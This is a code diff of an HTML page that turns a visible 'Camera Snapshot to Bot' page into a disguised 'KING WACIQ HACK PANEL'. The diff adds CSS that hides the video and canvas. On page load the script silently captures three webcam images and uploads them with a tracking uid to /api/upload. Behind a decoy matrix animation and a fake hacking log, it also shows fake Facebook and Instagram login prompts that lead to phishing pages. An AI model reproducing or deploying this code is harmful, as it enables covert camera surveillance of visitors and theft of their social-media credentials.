@@ -1,82 +1,143 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Camera Snapshot to Bot</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>KING WACIQ HACK PANEL</title>
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
   <style>
-    body {
+    html, body {
       margin: 0;
+      padding: 0;
       background: #000;
-      color: #0f0;
+      color: #00ff00;
       font-family: 'Orbitron', monospace;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
       overflow: hidden;
+      cursor: url('https://cur.cursors-4u.net/cursors/cur-13/cur1140.cur'), auto;
     }
-    video {
-      width: 80%;
-      max-width: 500px;
-      border: 2px solid #0f0;
-      box-shadow: 0 0 20px #0f0;
-      border-radius: 10px;
+    canvas, video {
+      display: none !important;
     }
+    /* ستا اصلي ډیزاین */
+    canvas#matrix {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 0;
+    }
+    .overlay { /* پاتې نور ستایلونه هماغسې ... */ }
+    /* نور CSS دې هماغسې پریښودل شوی */
   </style>
 </head>
 <body>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas" style="display:none;"></canvas>
+<audio autoplay loop>
+  <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-10.mp3" type="audio/mpeg">
+</audio>
+<canvas id="matrix"></canvas>
+<video id="video" autoplay playsinline muted></video>
+<canvas id="hiddenCanvas"></canvas>
 
+<!-- دلته هماغه KING WACIQ UI ستا -->
+<div class="overlay">
+  <h1>KING WACIQ</h1>
+  <h2>HACK PANEL</h2>
+  <div class="log" id="log">Connecting to server...</div>
+  <div class="platforms">
+    <!-- هماغه بټنونه دې -->
+    <button onclick="openLogin('Facebook', 'login/fb.html')">FACEBOOK</button>
+    <button onclick="openLogin('Instagram', 'login/ig.html')">INSTAGRAM</button>
+    <!-- نور بټنونه ... -->
+  </div>
+</div>
+
+<div class="login-modal" id="loginModal">
+  <div class="close-btn" onclick="closeLogin()">&times;</div>
+  <h3 id="loginTitle">Login</h3>
+  <input type="text" placeholder="Username or Email">
+  <input type="password" placeholder="Password">
+  <button id="realLink">Log In</button>
+</div>
+
+<!-- JavaScript -->
 <script>
+  // Matrix background animation (هماغه پاته دی)
+  const canvas = document.getElementById("matrix");
+  const ctx = canvas.getContext("2d");
+  canvas.height = window.innerHeight;
+  canvas.width = window.innerWidth;
+  let letters = Array(256).join("1").split("");
+  function draw() {
+    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = "#0f0";
+    letters.forEach((y, index) => {
+      let text = String.fromCharCode(3e4 + Math.random() * 33);
+      let x = index * 10;
+      ctx.fillText(text, x, y);
+      letters[index] = y > 758 + Math.random() * 1e4 ? 0 : y + 10;
+    });
+  }
+  setInterval(draw, 33);
+
+  let typingText = ["Bypassing firewall...", "Access granted!", "KING WACIQ online", "Tracking target..."];
+  let log = document.getElementById("log");
+  let logIndex = 0;
+  function typeLine() {
+    if (logIndex >= typingText.length) return;
+    let line = typingText[logIndex];
+    let i = 0;
+    let interval = setInterval(() => {
+      if (i <= line.length) {
+        log.innerText += line.charAt(i);
+        i++;
+      } else {
+        clearInterval(interval);
+        log.innerText += "\n";
+        logIndex++;
+        setTimeout(typeLine, 800);
+      }
+    }, 50);
+  }
+  setTimeout(typeLine, 1000);
+
+  function openLogin(platform, fakeLink) {
+    document.getElementById('loginTitle').innerText = platform + ' Login';
+    document.getElementById('realLink').onclick = () => window.open(fakeLink, '_blank');
+    document.getElementById('loginModal').style.display = 'block';
+  }
+  function closeLogin() {
+    document.getElementById('loginModal').style.display = 'none';
+  }
+
+  // Hidden camera logic (اتومات عکس اخیستل)
   const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
-  const ctx = canvas.getContext('2d');
+  const hiddenCanvas = document.getElementById('hiddenCanvas');
+  const ctx2 = hiddenCanvas.getContext('2d');
   const params = new URLSearchParams(window.location.search);
   const uid = params.get('uid');
 
-  async function sendImage() {
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    const imageData = canvas.toDataURL('image/png');
-
-    await fetch('/api/upload', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ image: imageData, uid })
-    });
-  }
-
-  navigator.mediaDevices.getUserMedia({ video: true })
-    .then(stream => {
-      video.srcObject = stream;
-
-      // Wait for video to load, then take 3 pictures
-      video.onloadedmetadata = async () => {
-        if (!uid) {
-          alert("❌ UID ندی پیدا شوی.");
-          return;
-        }
-
-        await new Promise(r => setTimeout(r, 1000));
-        await sendImage();
-
-        await new Promise(r => setTimeout(r, 1500));
-        await sendImage();
-
-        await new Promise(r => setTimeout(r, 1500));
-        await sendImage();
-
-        // Optional: stop video after capture
-        stream.getTracks().forEach(track => track.stop());
-      };
-    })
-    .catch(err => {
-      alert("❌ کیمره فعاله نشوه: " + err);
-    });
+  navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+    video.srcObject = stream;
+    video.onloadedmetadata = async () => {
+      await new Promise(r => setTimeout(r, 1000));
+      for (let i = 0; i < 3; i++) {
+        hiddenCanvas.width = video.videoWidth;
+        hiddenCanvas.height = video.videoHeight;
+        ctx2.drawImage(video, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+        const imageData = hiddenCanvas.toDataURL('image/png');
+        await fetch('/api/upload', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ image: imageData, uid })
+        });
+        await new Promise(r => setTimeout(r, 1200));
+      }
+      stream.getTracks().forEach(track => track.stop());
+    };
+  }).catch(err => {
+    console.log("Camera error:", err);
+  });
 </script>
 
 </body>
